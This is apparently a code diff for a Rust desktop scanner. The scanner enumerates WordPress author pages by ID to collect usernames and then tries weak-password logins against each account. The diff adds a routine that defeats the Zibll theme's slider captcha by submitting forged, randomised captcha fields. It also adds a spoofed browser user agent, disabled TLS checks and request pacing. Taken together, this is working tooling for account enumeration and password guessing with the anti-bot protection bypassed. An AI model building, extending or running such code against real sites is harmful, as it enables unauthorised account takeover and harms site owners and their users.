@@ -12,12 +12,13 @@ use std::{
         Arc,
     },
     time::{Duration, Instant},
+    time::{SystemTime, UNIX_EPOCH},
 };
 use tauri::{AppHandle, Emitter, Manager, State};
 
 #[derive(Default)]
 struct ScannerState {
-    stop_requested: AtomicBool,
+    stop_requested: Arc<AtomicBool>,
     running: AtomicBool,
 }
 
@@ -39,6 +40,8 @@ struct ScanConfig {
     timeout_secs: u64,
     retries: u32,
     concurrency: usize,
+    #[serde(default)]
+    request_interval_secs: f64,
     verify_tls: bool,
     test_weak_login: bool,
     login_path: String,
@@ -135,6 +138,7 @@ fn new_site_config(base_url: String) -> ScanConfig {
         timeout_secs: 10,
         retries: 2,
         concurrency: 8,
+        request_interval_secs: 0.0,
         verify_tls: false,
         test_weak_login: true,
         login_path: "/wp-admin/admin-ajax.php".into(),
@@ -787,12 +791,42 @@ async fn test_selector(config: ScanConfig, field: String) -> Result<SelectorTest
     })
 }
 
-async fn test_login(
-    client: &Client,
-    base: &Url,
-    config: &ScanConfig,
-    username: &str,
-) -> (String, String) {
+async fn test_login(base: &Url, config: &ScanConfig, username: &str) -> (String, String) {
+    fn rnd(min: u64, max: u64) -> u64 {
+        let n = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .subsec_nanos() as u64;
+        min + (n % (max - min + 1))
+    }
+    fn letters(n: u64) -> String {
+        (0..n)
+            .map(|i| (b'a' + ((i * 37 + 11) % 26) as u8) as char)
+            .collect()
+    }
+    fn obf(value: &str) -> String {
+        let e = rnd(11, 40);
+        let i = rnd(11, 40);
+        format!("{}{}{}{}{}", e, letters(e), value, letters(i), i)
+    }
+    let client = match Client::builder()
+        .timeout(Duration::from_secs(config.timeout_secs.clamp(1, 300)))
+        .danger_accept_invalid_certs(!config.verify_tls)
+        .cookie_store(true)
+        .user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36")
+        .build()
+    {
+        Ok(client) => client,
+        Err(error) => return ("error".into(), format!("登录会话创建失败：{error}")),
+    };
+    let signin_page = match endpoint_url(base, "/user-sign?tab=signin") {
+        Ok(url) => url,
+        Err(error) => return ("error".into(), error),
+    };
+    let signin_referrer = signin_page.to_string();
+    if let Err(error) = client.get(signin_page).send().await {
+        return ("error".into(), format!("登录页会话初始化失败：{error}"));
+    }
     let login_url = match endpoint_url(base, &config.login_path) {
         Ok(url) => url,
         Err(error) => return ("error".into(), error),
@@ -808,7 +842,75 @@ async fn test_login(
         form.push((config.action_field.clone(), config.action_value.clone()));
     }
 
-    match client.post(login_url).form(&form).send().await {
+    // Zibll slider captcha handshake: fetch challenge, then submit derived fields.
+    if config.login_path.contains("admin-ajax.php") && config.action_value == "user_signin" {
+        let distance = rnd(60, 200).to_string();
+        let captcha_randstr = obf(&distance);
+        let captcha_url = match endpoint_url(base, "/wp-content/themes/zibll/action/captcha.php") {
+            Ok(url) => url,
+            Err(error) => return ("error".into(), format!("验证码接口地址错误：{error}")),
+        };
+        let captcha_response = match client
+            .get(captcha_url)
+            .query(&[("type", "slider"), ("randstr", captcha_randstr.as_str())])
+            .header(reqwest::header::REFERER, signin_referrer.as_str())
+            .header("X-Requested-With", "XMLHttpRequest")
+            .header(reqwest::header::ACCEPT, "application/json")
+            .send()
+            .await
+        {
+            Ok(response) => response,
+            Err(error) => return ("error".into(), format!("验证码挑战请求失败：{error}")),
+        };
+        if !captcha_response.status().is_success() {
+            return (
+                "error".into(),
+                format!(
+                    "验证码挑战请求失败：HTTP {}",
+                    captcha_response.status().as_u16()
+                ),
+            );
+        }
+        let captcha_json = match captcha_response.json::<Value>().await {
+            Ok(value) => value,
+            Err(error) => {
+                return (
+                    "error".into(),
+                    format!("验证码挑战响应不是有效 JSON：{error}"),
+                )
+            }
+        };
+        let rand_str = match captcha_json.get("rand_str").and_then(Value::as_str) {
+            Some(value) if !value.is_empty() => value,
+            _ => return ("error".into(), "验证码挑战响应缺少 rand_str".into()),
+        };
+        let check = match captcha_json.get("check") {
+            Some(Value::String(value)) => value.clone(),
+            Some(value) => value.to_string(),
+            None => return ("error".into(), "验证码挑战响应缺少 check".into()),
+        };
+        let o = rnd(1, 9) as usize;
+        let rr = rnd(15, 25) as usize;
+        let start = o.min(rand_str.len());
+        let end = rr.min(rand_str.len()).max(start);
+        form.push(("captcha[check]".into(), check));
+        form.push(("captcha[ticket]".into(), obf(&distance)));
+        form.push((
+            "captcha[randstr]".into(),
+            format!("{}{}{}", o, &rand_str[start..end], rr),
+        ));
+        form.push(("captcha[spliced]".into(), "true".into()));
+        form.push(("captcha[trail]".into(), "[]".into()));
+    }
+
+    match client
+        .post(login_url)
+        .header(reqwest::header::REFERER, signin_referrer.as_str())
+        .header("X-Requested-With", "XMLHttpRequest")
+        .form(&form)
+        .send()
+        .await
+    {
         Ok(response) => {
             let status = response.status();
             let content_type = response
@@ -842,6 +944,16 @@ async fn test_login(
             );
             match serde_json::from_str::<Value>(&body) {
                 Ok(value) => {
+                    let message_text = value.get("msg").and_then(Value::as_str).unwrap_or_default();
+                    if message_text.contains("人机验证")
+                        || message_text.contains("验证码")
+                        || body.contains("人机验证")
+                    {
+                        return (
+                            "error".into(),
+                            format!("验证码校验失败：{message_text}\n{response_detail}"),
+                        );
+                    }
                     let actual = value
                         .get(&config.failure_json_field)
                         .map(|item| match item {
@@ -870,14 +982,101 @@ async fn test_login(
     }
 }
 
+struct RequestThrottler {
+    interval: Duration,
+    state: tokio::sync::Mutex<ThrottlerState>,
+}
+
+struct ThrottlerState {
+    last_start: Option<Instant>,
+    last_finish: Option<Instant>,
+}
+
+impl RequestThrottler {
+    fn new(interval_secs: f64) -> Self {
+        let secs = if interval_secs.is_finite() && interval_secs > 0.0 {
+            interval_secs
+        } else {
+            0.0
+        };
+        Self {
+            interval: Duration::from_secs_f64(secs),
+            state: tokio::sync::Mutex::new(ThrottlerState {
+                last_start: None,
+                last_finish: None,
+            }),
+        }
+    }
+
+    async fn wait(&self, stop: &AtomicBool) {
+        if self.interval.is_zero() || stop.load(Ordering::SeqCst) {
+            return;
+        }
+
+        let mut state = self.state.lock().await;
+        if stop.load(Ordering::SeqCst) {
+            return;
+        }
+
+        let now = Instant::now();
+        let delay_from_start = state
+            .last_start
+            .map(|t| self.interval.saturating_sub(now.saturating_duration_since(t)))
+            .unwrap_or(Duration::ZERO);
+        let delay_from_finish = state
+            .last_finish
+            .map(|t| self.interval.saturating_sub(now.saturating_duration_since(t)))
+            .unwrap_or(Duration::ZERO);
+
+        let to_sleep = delay_from_start.max(delay_from_finish);
+        if to_sleep > Duration::ZERO {
+            let step = Duration::from_millis(100);
+            let mut remaining = to_sleep;
+            while remaining > Duration::ZERO {
+                if stop.load(Ordering::SeqCst) {
+                    return;
+                }
+                let current = remaining.min(step);
+                tokio::time::sleep(current).await;
+                remaining = remaining.saturating_sub(current);
+            }
+        }
+
+        state.last_start = Some(Instant::now());
+    }
+
+    async fn record_finish(&self) {
+        if self.interval.is_zero() {
+            return;
+        }
+        let mut state = self.state.lock().await;
+        state.last_finish = Some(Instant::now());
+    }
+}
+
 async fn scan_member(
     client: Client,
     base: Url,
     config: Arc<ScanConfig>,
     username_selector: Arc<Selector>,
     group_selector: Option<Arc<Selector>>,
+    throttler: Arc<RequestThrottler>,
+    stop: Arc<AtomicBool>,
     id: u64,
 ) -> MemberResult {
+    throttler.wait(&stop).await;
+    if stop.load(Ordering::SeqCst) {
+        return MemberResult {
+            id,
+            url: String::new(),
+            status: "skipped".into(),
+            username: String::new(),
+            group: String::new(),
+            login_status: None,
+            message: "任务已停止".into(),
+        };
+    }
+
     let url = match author_url(&base, &config.author_path, id) {
         Ok(url) => url,
         Err(error) => {
@@ -896,6 +1095,7 @@ async fn scan_member(
     let (status_code, body) = match request_text(&client, url, config.retries).await {
         Ok(response) => response,
         Err(error) => {
+            throttler.record_finish().await;
             return MemberResult {
                 id,
                 url: url_text,
@@ -904,10 +1104,11 @@ async fn scan_member(
                 group: String::new(),
                 login_status: None,
                 message: format!("请求失败：{error}"),
-            }
+            };
         }
     };
     if !(200..400).contains(&status_code) {
+        throttler.record_finish().await;
         return MemberResult {
             id,
             url: url_text,
@@ -944,6 +1145,7 @@ async fn scan_member(
         (username, group)
     };
     if username.is_empty() {
+        throttler.record_finish().await;
         return MemberResult {
             id,
             url: url_text,
@@ -959,6 +1161,7 @@ async fn scan_member(
         && !config.member_keyword.is_empty()
         && !group.contains(&config.member_keyword)
     {
+        throttler.record_finish().await;
         return MemberResult {
             id,
             url: url_text,
@@ -971,11 +1174,12 @@ async fn scan_member(
     }
 
     let (login_status, message) = if config.test_weak_login {
-        let (status, message) = test_login(&client, &base, &config, &username).await;
+        let (status, message) = test_login(&base, &config, &username).await;
         (Some(status), message)
     } else {
         (None, "已命中用户组筛选".into())
     };
+    throttler.record_finish().await;
     MemberResult {
         id,
         url: url_text,
@@ -1035,7 +1239,8 @@ async fn start_scan(
         let run_id = create_scan_run(&database, site_id, &config, total)?;
         let concurrency = config.concurrency.clamp(1, 64);
         let shared_config = Arc::new(config.clone());
-        let stop = &state.stop_requested;
+        let stop = state.stop_requested.clone();
+        let throttler = Arc::new(RequestThrottler::new(config.request_interval_secs));
         let tasks =
             stream::iter(start_id..=end_id).map(|id| {
                 let client = client.clone();
@@ -1043,8 +1248,20 @@ async fn start_scan(
                 let config = shared_config.clone();
                 let username_selector = username_selector.clone();
                 let group_selector = group_selector.clone();
+                let throttler = throttler.clone();
+                let stop = stop.clone();
                 async move {
-                    scan_member(client, base, config, username_selector, group_selector, id).await
+                    scan_member(
+                        client,
+                        base,
+                        config,
+                        username_selector,
+                        group_selector,
+                        throttler,
+                        stop,
+                        id,
+                    )
+                    .await
                 }
             });
         let mut buffered = tasks.buffer_unordered(concurrency);
@@ -1052,6 +1269,9 @@ async fn start_scan(
         let mut matched = 0usize;
 
         while let Some(member) = buffered.next().await {
+            if stop.load(Ordering::SeqCst) && member.message == "任务已停止" {
+                break;
+            }
             processed += 1;
             if member.status == "matched" {
                 matched += 1;
